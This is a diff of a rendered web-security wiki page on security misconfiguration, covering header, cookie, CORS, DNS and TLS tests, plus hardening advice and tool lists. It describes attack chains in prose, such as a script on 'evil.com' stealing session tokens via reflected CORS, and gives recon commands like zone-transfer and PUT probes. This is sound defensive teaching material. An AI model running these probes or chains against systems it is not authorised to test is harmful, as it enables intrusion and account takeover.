+</span></span><span style="display:flex;"><span>Reference <span style="color:#66d9ef">for</span> cache poisoning/misconfig behavior: OWASP Cache Poisoning</span></span></code></pre></div><h3 id="14-running-with-elevated-privileges--session-misconfiguration-session-fixation--cookie-theft--blast-radius"><strong>14. Running With Elevated Privileges &amp; Session Misconfiguration (Session Fixation / Cookie Theft / Blast Radius)</strong><a class="anchor" href="#14-running-with-elevated-privileges--session-misconfiguration-session-fixation--cookie-theft--blast-radius">#</a></h3>
 <p><strong>What to test:</strong></p>
 <p><strong>A) Elevated privilege / blast radius</strong></p>
 <ul>
@@ -1714,205 +1607,152 @@ https://github.com/alex-shpak/hugo-book
 <li>Weak session lifetime/reuse behaviors after logout/role change</li>
 </ul>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>A<span style="color:#f92672">)</span> Session cookie safety <span style="color:#f92672">(</span>inspect Set-Cookie via proxy or curl<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>A<span style="color:#f92672">)</span> Session cookie safety <span style="color:#f92672">(</span>inspect Set-Cookie via proxy or curl<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>curl -s -I https://target.com/ | findstr /i <span style="color:#e6db74">&#34;set-cookie&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>B<span style="color:#f92672">)</span> Session fixation check <span style="color:#f92672">(</span>high level workflow<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>1. Start unauthenticated visit -&gt; capture session cookie value
 </span></span><span style="display:flex;"><span>2. Authenticate -&gt; verify session cookie value changes <span style="color:#f92672">(</span>rotation<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#  If it stays the same, it may be vulnerable to fixation.</span>
-</span></span></code></pre></div><p><strong>Expected :</strong></p>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  If it stays the same, it may be vulnerable to fixation.</span></span></span></code></pre></div><p><strong>Expected :</strong></p>
 <ul>
 <li>Root/elevated privilege: once any web exploit works, impact grows (more paths to host/cloud compromise).</li>
 <li>Session fixation: attacker can force a known session ID to a victim; if server doesn’t rotate on auth, attacker can reuse the session.</li>
 <li>Cookie misconfig: without <code>HttpOnly</code>/<code>Secure</code>/correct <code>SameSite</code>, theft/CSRF risk increases.</li>
 </ul>
 <p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>cookie inspection, login sequencing, session rotation comparison<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>cookie inspection, login sequencing, session rotation comparison<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>Cookie/security references:
 </span></span><span style="display:flex;"><span>- MDN - Cookie security flags
 </span></span><span style="display:flex;"><span>- OWASP WSTG - Session Fixation testing
 </span></span><span style="display:flex;"><span>Elevated privilege hardening reference <span style="color:#f92672">(</span>containers<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>Docker security best practices <span style="color:#f92672">(</span>stop running as root<span style="color:#f92672">)</span>
-</span></span></code></pre></div><h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-cors--xss--account-takeover">
-  1. CORS + XSS → Account Takeover
-  <a class="anchor" href="#1-cors--xss--account-takeover">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>Docker security best practices <span style="color:#f92672">(</span>stop running as root<span style="color:#f92672">)</span></span></span></code></pre></div><h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-cors--xss--account-takeover">1. CORS + XSS → Account Takeover<a class="anchor" href="#1-cors--xss--account-takeover">#</a></h3>
 <p><strong>Flow:</strong> API reflects an arbitrary <code>Origin</code> with <code>Access-Control-Allow-Credentials: true</code> → attacker’s script (hosted on <code>evil.com</code>, or injected via XSS on a <em>trusted subdomain</em> like <code>sub.target.com</code>) runs on an origin the policy allows → it fetches <code>/api/session</code> with <code>credentials: 'include'</code> → browser exposes the response because the origin is reflected/trusted → session token exfiltrated → account takeover.</p>
 <p><strong>Note:</strong> Pure reflected-origin CORS needs no XSS at all (the victim just visits <code>evil.com</code>). XSS only adds to the chain when the injected script sits on an origin the CORS policy trusts — a same-origin XSS already reads its own API without needing CORS.</p>
 <p><strong>Takeaway:</strong> Combine CORS with subdomain takeover, XSS on a trusted subdomain, or open redirect to escalate impact.</p>
-<h3 id="2-missing-hsts--mitm--credential-theft">
-  2. Missing HSTS + MITM → Credential Theft
-  <a class="anchor" href="#2-missing-hsts--mitm--credential-theft">#</a>
-</h3>
+<h3 id="2-missing-hsts--mitm--credential-theft">2. Missing HSTS + MITM → Credential Theft<a class="anchor" href="#2-missing-hsts--mitm--credential-theft">#</a></h3>
 <p><strong>Flow:</strong> No HSTS → user types <code>example.com</code> or follows HTTP link → traffic over HTTP → attacker intercepts → steals cookies/credentials.</p>
 <p><strong>Takeaway:</strong> Missing HSTS enables protocol downgrade and cookie theft on shared networks.</p>
-<h3 id="3-missing-x-frame-options--phishing--clickjacking">
-  3. Missing X-Frame-Options + Phishing → Clickjacking
-  <a class="anchor" href="#3-missing-x-frame-options--phishing--clickjacking">#</a>
-</h3>
+<h3 id="3-missing-x-frame-options--phishing--clickjacking">3. Missing X-Frame-Options + Phishing → Clickjacking<a class="anchor" href="#3-missing-x-frame-options--phishing--clickjacking">#</a></h3>
 <p><strong>Flow:</strong> Sensitive action (e.g. “Confirm transfer”) in frameable page → attacker loads it in transparent iframe → victim clicks “Play game” → actually clicks “Confirm” → unauthorized action.</p>
 <p><strong>Takeaway:</strong> Missing X-Frame-Options makes clickjacking trivial for state-changing actions.</p>
-<h3 id="4-weak-csp--stored-xss--data-exfiltration">
-  4. Weak CSP + Stored XSS → Data Exfiltration
-  <a class="anchor" href="#4-weak-csp--stored-xss--data-exfiltration">#</a>
-</h3>
+<h3 id="4-weak-csp--stored-xss--data-exfiltration">4. Weak CSP + Stored XSS → Data Exfiltration<a class="anchor" href="#4-weak-csp--stored-xss--data-exfiltration">#</a></h3>
 <p><strong>Flow:</strong> CSP allows <code>unsafe-inline</code> or <code>unsafe-eval</code> → stored XSS executes → attacker steals tokens, keys, or PII.</p>
 <p><strong>Takeaway:</strong> CSP weaknesses remove a key defense against XSS.</p>
-<h3 id="5-zone-transfer--subdomain-enumeration--takeover">
-  5. Zone Transfer → Subdomain Enumeration → Takeover
-  <a class="anchor" href="#5-zone-transfer--subdomain-enumeration--takeover">#</a>
-</h3>
+<h3 id="5-zone-transfer--subdomain-enumeration--takeover">5. Zone Transfer → Subdomain Enumeration → Takeover<a class="anchor" href="#5-zone-transfer--subdomain-enumeration--takeover">#</a></h3>
 <p><strong>Flow:</strong> AXFR succeeds → full zone list → find CNAMEs to third-party services → check for takeover → claim subdomain → abuse for phishing/OAuth/CORS.</p>
 <p><strong>Takeaway:</strong> DNS misconfiguration feeds subdomain takeover and further recon.</p>
-<h3 id="6-exposed-config--cloud-credentials--full-compromise">
-  6. Exposed Config + Cloud Credentials → Full Compromise
-  <a class="anchor" href="#6-exposed-config--cloud-credentials--full-compromise">#</a>
-</h3>
+<h3 id="6-exposed-config--cloud-credentials--full-compromise">6. Exposed Config + Cloud Credentials → Full Compromise<a class="anchor" href="#6-exposed-config--cloud-credentials--full-compromise">#</a></h3>
 <p><strong>Flow:</strong> <code>config.json</code> or <code>.env</code> exposed → AWS/GCP/Azure keys found → attacker uses keys for cloud access → data exfiltration, resource abuse, lateral movement.</p>
 <p><strong>Takeaway:</strong> Config exposure often leads to cloud and infra compromise.</p>
-<h3 id="7-default-credentials--exposed-admin--full-control">
-  7. Default Credentials + Exposed Admin → Full Control
-  <a class="anchor" href="#7-default-credentials--exposed-admin--full-control">#</a>
-</h3>
+<h3 id="7-default-credentials--exposed-admin--full-control">7. Default Credentials + Exposed Admin → Full Control<a class="anchor" href="#7-default-credentials--exposed-admin--full-control">#</a></h3>
 <p><strong>Flow:</strong> Admin panel reachable from internet → default admin:admin works → attacker changes settings, adds users, deploys malware.</p>
 <p><strong>Takeaway:</strong> Default creds plus exposed admin are a direct path to compromise.</p>
-<h3 id="8-email-spoofing-no-dmarc--phishing">
-  8. Email Spoofing (No DMARC) + Phishing
-  <a class="anchor" href="#8-email-spoofing-no-dmarc--phishing">#</a>
-</h3>
+<h3 id="8-email-spoofing-no-dmarc--phishing">8. Email Spoofing (No DMARC) + Phishing<a class="anchor" href="#8-email-spoofing-no-dmarc--phishing">#</a></h3>
 <p><strong>Flow:</strong> No DMARC or p=none → spoofed emails reach inbox → victim trusts “From: <a href="mailto:ceo@company.com">ceo@company.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">” → enters credentials or wiring info.</p>
 <p><strong>Takeaway:</strong> Missing DMARC enables convincing phishing and BEC.</p>
-<h2 id="service-specific-considerations">
-  Service-Specific Considerations
-  <a class="anchor" href="#service-specific-considerations">#</a>
-</h2>
-<h3 id="nginx">
-  Nginx
-  <a class="anchor" href="#nginx">#</a>
-</h3>
+<h2 id="service-specific-considerations">Service-Specific Considerations<a class="anchor" href="#service-specific-considerations">#</a></h2>
+<h3 id="nginx">Nginx<a class="anchor" href="#nginx">#</a></h3>
 <ul>
 <li><strong>Directory listing:</strong> <code>autoindex on</code> → disable</li>
 <li><strong>Server token:</strong> <code>server_tokens off</code> to hide version</li>
 <li><strong>Default pages:</strong> Replace <code>index.html</code>, remove Nginx references from error pages</li>
 <li><strong>TLS:</strong> Configure strong ciphers, disable SSLv3/TLS1.0</li>
 </ul>
-<h3 id="apache">
-  Apache
-  <a class="anchor" href="#apache">#</a>
-</h3>
+<h3 id="apache">Apache<a class="anchor" href="#apache">#</a></h3>
 <ul>
 <li><strong>Directory listing:</strong> <code>Options -Indexes</code></li>
 <li><strong>ServerTokens:</strong> Set to <code>Prod</code> or <code>Minor</code></li>
 <li><strong>Sample/status:</strong> Remove <code>server-status</code>, <code>server-info</code>, <code>manual</code></li>
 <li><strong>TraceEnable:</strong> Set to <code>Off</code></li>
 </ul>
-<h3 id="microsoft-iis">
-  Microsoft IIS
-  <a class="anchor" href="#microsoft-iis">#</a>
-</h3>
+<h3 id="microsoft-iis">Microsoft IIS<a class="anchor" href="#microsoft-iis">#</a></h3>
 <ul>
 <li><strong>Directory browsing:</strong> Disable in IIS Manager</li>
 <li><strong>X-Powered-By:</strong> Remove via <code>web.config</code> or server config</li>
 <li><strong>Default page:</strong> Replace <code>iisstart.htm</code>, check for shortname enumeration (tilde)</li>
 <li><strong>PUT/DELETE:</strong> Restrict or disable for production paths</li>
 </ul>
-<h3 id="cloud-aws-s3-azure-blob-gcp">
-  Cloud (AWS S3, Azure Blob, GCP)
-  <a class="anchor" href="#cloud-aws-s3-azure-blob-gcp">#</a>
-</h3>
+<h3 id="cloud-aws-s3-azure-blob-gcp">Cloud (AWS S3, Azure Blob, GCP)<a class="anchor" href="#cloud-aws-s3-azure-blob-gcp">#</a></h3>
 <ul>
 <li><strong>Bucket policy:</strong> Avoid <code>s3:GetObject</code> with <code>Principal: &quot;*&quot;</code></li>
 <li><strong>ACL:</strong> Avoid public-read; use least-privilege IAM</li>
 <li><strong>Tools:</strong> aws s3api get-bucket-acl, ScoutSuite, Prowler</li>
 </ul>
-<h2 id="test-cases-quick-reference">
-  Test Cases Quick Reference
-  <a class="anchor" href="#test-cases-quick-reference">#</a>
-</h2>
+<h2 id="test-cases-quick-reference">Test Cases Quick Reference<a class="anchor" href="#test-cases-quick-reference">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Misconfiguration</th>
-<th>Test Action</th>
-<th>Expected</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>HSTS</td>
-<td><code>curl -I</code> over HTTPS</td>
-<td><code>Strict-Transport-Security</code> present</td>
-</tr>
-<tr>
-<td>X-Frame-Options</td>
-<td>Inspect response headers</td>
-<td><code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code></td>
-</tr>
-<tr>
-<td>CORS</td>
-<td>Send <code>Origin: evil.com</code>, check response</td>
-<td>No reflection of arbitrary Origin</td>
-</tr>
-<tr>
-<td>Cookie HttpOnly</td>
-<td>Inspect <code>Set-Cookie</code></td>
-<td>Session cookies have HttpOnly</td>
-</tr>
-<tr>
-<td>Cookie Secure</td>
-<td>Inspect <code>Set-Cookie</code> over HTTPS</td>
-<td>Cookies have Secure</td>
-</tr>
-<tr>
-<td>SPF/DKIM/DMARC</td>
-<td><code>dig TXT</code> on domain and <code>_dmarc</code></td>
-<td>Valid SPF, DKIM, DMARC policy</td>
-</tr>
-<tr>
-<td>Zone Transfer</td>
-<td><code>dig axfr @ns target.com</code></td>
-<td>AXFR denied</td>
-</tr>
-<tr>
-<td>CAA</td>
-<td><code>dig CAA target.com</code></td>
-<td>CAA records restrict CAs</td>
-</tr>
-<tr>
-<td>TLS</td>
-<td>testssl.sh / openssl s_client</td>
-<td>Strong ciphers, TLS 1.2+ only</td>
-</tr>
-<tr>
-<td>HTTP PUT</td>
-<td><code>curl -X PUT</code></td>
-<td>405 or 403</td>
-</tr>
-<tr>
-<td>Directory Listing</td>
-<td>Request <code>/</code> or dirs</td>
-<td>No listing of directory contents</td>
-</tr>
-<tr>
-<td>Version Disclosure</td>
-<td>Check Server, X-Powered-By</td>
-<td>No versions or generic values</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Misconfiguration</th>
+					<th>Test Action</th>
+					<th>Expected</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>HSTS</td>
+					<td><code>curl -I</code> over HTTPS</td>
+					<td><code>Strict-Transport-Security</code> present</td>
+			</tr>
+			<tr>
+					<td>X-Frame-Options</td>
+					<td>Inspect response headers</td>
+					<td><code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code></td>
+			</tr>
+			<tr>
+					<td>CORS</td>
+					<td>Send <code>Origin: evil.com</code>, check response</td>
+					<td>No reflection of arbitrary Origin</td>
+			</tr>
+			<tr>
+					<td>Cookie HttpOnly</td>
+					<td>Inspect <code>Set-Cookie</code></td>
+					<td>Session cookies have HttpOnly</td>
+			</tr>
+			<tr>
+					<td>Cookie Secure</td>
+					<td>Inspect <code>Set-Cookie</code> over HTTPS</td>
+					<td>Cookies have Secure</td>
+			</tr>
+			<tr>
+					<td>SPF/DKIM/DMARC</td>
+					<td><code>dig TXT</code> on domain and <code>_dmarc</code></td>
+					<td>Valid SPF, DKIM, DMARC policy</td>
+			</tr>
+			<tr>
+					<td>Zone Transfer</td>
+					<td><code>dig axfr @ns target.com</code></td>
+					<td>AXFR denied</td>
+			</tr>
+			<tr>
+					<td>CAA</td>
+					<td><code>dig CAA target.com</code></td>
+					<td>CAA records restrict CAs</td>
+			</tr>
+			<tr>
+					<td>TLS</td>
+					<td>testssl.sh / openssl s_client</td>
+					<td>Strong ciphers, TLS 1.2+ only</td>
+			</tr>
+			<tr>
+					<td>HTTP PUT</td>
+					<td><code>curl -X PUT</code></td>
+					<td>405 or 403</td>
+			</tr>
+			<tr>
+					<td>Directory Listing</td>
+					<td>Request <code>/</code> or dirs</td>
+					<td>No listing of directory contents</td>
+			</tr>
+			<tr>
+					<td>Version Disclosure</td>
+					<td>Check Server, X-Powered-By</td>
+					<td>No versions or generic values</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual">
-  Manual
-  <a class="anchor" href="#manual">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual">Manual<a class="anchor" href="#manual">#</a></h3>
 <ul>
 <li><strong>Headers:</strong> curl, Burp, browser DevTools</li>
 <li><strong>CORS:</strong> Burp Repeater with custom Origin</li>
@@ -1922,10 +1762,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Methods:</strong> curl -X OPTIONS/PUT/DELETE</li>
 <li><strong>Files:</strong> manual paths, ffuf/gobuster</li>
 </ul>
-<h3 id="automated">
-  Automated
-  <a class="anchor" href="#automated">#</a>
-</h3>
+<h3 id="automated">Automated<a class="anchor" href="#automated">#</a></h3>
 <ul>
 <li><strong>Headers:</strong> Mozilla Observatory, SecurityHeaders.com, Nuclei (headers/misconfig)</li>
 <li><strong>General:</strong> Nuclei, OWASP ZAP, Burp Scanner, Nikto</li>
@@ -1933,10 +1770,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>DNS:</strong> dnsrecon, fierce</li>
 <li><strong>Email:</strong> MXToolbox, EmailSecCheck, DMARC analyzers</li>
 </ul>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Data breach:</strong> Exposed configs, open storage, verbose errors</li>
 <li><strong>Account takeover:</strong> CORS + XSS, cookie theft, session fixation</li>
@@ -1946,10 +1780,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Recon :</strong> Zone transfer, version disclosure, default pages</li>
 <li><strong>Compliance:</strong> GDPR, HIPAA, PCI-DSS violations and fines</li>
 </ul>
-<h2 id="prevention-techniques">
-  Prevention Techniques
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
+<h2 id="prevention-techniques">Prevention Techniques<a class="anchor" href="#prevention-techniques">#</a></h2>
 <ul>
 <li>Apply secure defaults; avoid shipping with known weak settings</li>
 <li>Change default credentials; use strong, unique passwords</li>
@@ -1966,120 +1797,114 @@ https://github.com/alex-shpak/hugo-book
 <li>Keep components patched; track and update dependencies</li>
 <li>Use automation (CI/CD checks, scanners) for config validation</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Category</th>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Headers</td>
-<td>Mozilla Observatory</td>
-<td>HTTP header security scan</td>
-</tr>
-<tr>
-<td>Headers</td>
-<td>SecurityHeaders.com</td>
-<td>Header grading and recommendations</td>
-</tr>
-<tr>
-<td>Headers</td>
-<td>curl</td>
-<td>Manual header inspection</td>
-</tr>
-<tr>
-<td>CORS</td>
-<td>Burp Suite</td>
-<td>Origin manipulation, CORS testing</td>
-</tr>
-<tr>
-<td>Cookies</td>
-<td>Browser DevTools</td>
-<td>Inspect Set-Cookie attributes</td>
-</tr>
-<tr>
-<td>DNS</td>
-<td>dig, nslookup</td>
-<td>Zone transfer, CAA, SPF/DMARC</td>
-</tr>
-<tr>
-<td>DNS</td>
-<td>dnsrecon</td>
-<td>Recon, AXFR, subdomains</td>
-</tr>
-<tr>
-<td>TLS</td>
-<td>testssl.sh</td>
-<td>TLS/cipher/protocol checks</td>
-</tr>
-<tr>
-<td>TLS</td>
-<td>sslscan</td>
-<td>Cipher and protocol enumeration</td>
-</tr>
-<tr>
-<td>TLS</td>
-<td>OpenSSL</td>
-<td>Manual TLS checks</td>
-</tr>
-<tr>
-<td>Scanners</td>
-<td>Nuclei</td>
-<td>Misconfig and header templates</td>
-</tr>
-<tr>
-<td>Scanners</td>
-<td>OWASP ZAP</td>
-<td>Passive/active config checks</td>
-</tr>
-<tr>
-<td>Scanners</td>
-<td>Nikto</td>
-<td>Web server and config issues</td>
-</tr>
-<tr>
-<td>Components</td>
-<td>retire.js</td>
-<td>Outdated JS libraries with known CVEs</td>
-</tr>
-<tr>
-<td>Components</td>
-<td>OWASP Dependency-Check</td>
-<td>Dependency vulnerability scan</td>
-</tr>
-<tr>
-<td>Email</td>
-<td>MXToolbox</td>
-<td>SPF, DKIM, DMARC checks</td>
-</tr>
-<tr>
-<td>Email</td>
-<td>EmailSecCheck</td>
-<td>SPF/DMARC misconfig detection</td>
-</tr>
-<tr>
-<td>Fuzzing</td>
-<td>ffuf, gobuster</td>
-<td>File/dir discovery, backup/config hunting</td>
-</tr>
-<tr>
-<td>Version</td>
-<td>whatweb, Wappalyzer</td>
-<td>Tech and version detection</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Category</th>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Headers</td>
+					<td>Mozilla Observatory</td>
+					<td>HTTP header security scan</td>
+			</tr>
+			<tr>
+					<td>Headers</td>
+					<td>SecurityHeaders.com</td>
+					<td>Header grading and recommendations</td>
+			</tr>
+			<tr>
+					<td>Headers</td>
+					<td>curl</td>
+					<td>Manual header inspection</td>
+			</tr>
+			<tr>
+					<td>CORS</td>
+					<td>Burp Suite</td>
+					<td>Origin manipulation, CORS testing</td>
+			</tr>
+			<tr>
+					<td>Cookies</td>
+					<td>Browser DevTools</td>
+					<td>Inspect Set-Cookie attributes</td>
+			</tr>
+			<tr>
+					<td>DNS</td>
+					<td>dig, nslookup</td>
+					<td>Zone transfer, CAA, SPF/DMARC</td>
+			</tr>
+			<tr>
+					<td>DNS</td>
+					<td>dnsrecon</td>
+					<td>Recon, AXFR, subdomains</td>
+			</tr>
+			<tr>
+					<td>TLS</td>
+					<td>testssl.sh</td>
+					<td>TLS/cipher/protocol checks</td>
+			</tr>
+			<tr>
+					<td>TLS</td>
+					<td>sslscan</td>
+					<td>Cipher and protocol enumeration</td>
+			</tr>
+			<tr>
+					<td>TLS</td>
+					<td>OpenSSL</td>
+					<td>Manual TLS checks</td>
+			</tr>
+			<tr>
+					<td>Scanners</td>
+					<td>Nuclei</td>
+					<td>Misconfig and header templates</td>
+			</tr>
+			<tr>
+					<td>Scanners</td>
+					<td>OWASP ZAP</td>
+					<td>Passive/active config checks</td>
+			</tr>
+			<tr>
+					<td>Scanners</td>
+					<td>Nikto</td>
+					<td>Web server and config issues</td>
+			</tr>
+			<tr>
+					<td>Components</td>
+					<td>retire.js</td>
+					<td>Outdated JS libraries with known CVEs</td>
+			</tr>
+			<tr>
+					<td>Components</td>
+					<td>OWASP Dependency-Check</td>
+					<td>Dependency vulnerability scan</td>
+			</tr>
+			<tr>
+					<td>Email</td>
+					<td>MXToolbox</td>
+					<td>SPF, DKIM, DMARC checks</td>
+			</tr>
+			<tr>
+					<td>Email</td>
+					<td>EmailSecCheck</td>
+					<td>SPF/DMARC misconfig detection</td>
+			</tr>
+			<tr>
+					<td>Fuzzing</td>
+					<td>ffuf, gobuster</td>
+					<td>File/dir discovery, backup/config hunting</td>
+			</tr>
+			<tr>
+					<td>Version</td>
+					<td>whatweb, Wappalyzer</td>
+					<td>Tech and version detection</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="good-to-read">
-  Good to Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://medium.com/@rajqureshi07/a-practical-exploitation-of-a-cors-misconfiguration-4169134ac907" target="_blank" rel="noreferrer noopener nofollow">A Practical Exploitation of a CORS Misconfiguration (Raj Qureshi, Medium)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — API reflected Origin with credentials; Burp testing and fetch-based PoC for data exfiltration.</li>
 <li><a href="https://medium.com/@maajix/from-cors-misconfiguration-to-account-takeover-1231f263a90e" target="_blank" rel="noreferrer noopener nofollow">From CORS Misconfiguration to Account Takeover (Maaj, Medium)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — How CORS issues chain with other flaws for full ATO and credential theft.</li>
@@ -2094,10 +1919,7 @@ https://github.com/alex-shpak/hugo-book
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README" target="_blank" rel="noreferrer noopener nofollow">OWASP WSTG – Configuration and Deployment Management</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — 14 test cases: network, platform, files, backups, admin, HTTP methods, HSTS, CORS/cross-domain, subdomain takeover, cloud, CSP, path confusion.</li>
 <li><a href="https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/" target="_blank" rel="noreferrer noopener nofollow">OWASP A02:2025 – Security Misconfiguration</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Top 10 entry (up from A05 in 2021): causes, examples, prevention.</li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <p><a href="https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://observatory.mozilla.org/" target="_blank" rel="noreferrer noopener nofollow">https://observatory.mozilla.org/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -2116,49 +1938,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Security%20Misconfiguration.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Security Logging and Monitoring Failures</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Sensitive-Data-Exposure/" class="flex align-center">
+        <span>Sensitive Data Exposure</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2235,15 +2070,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
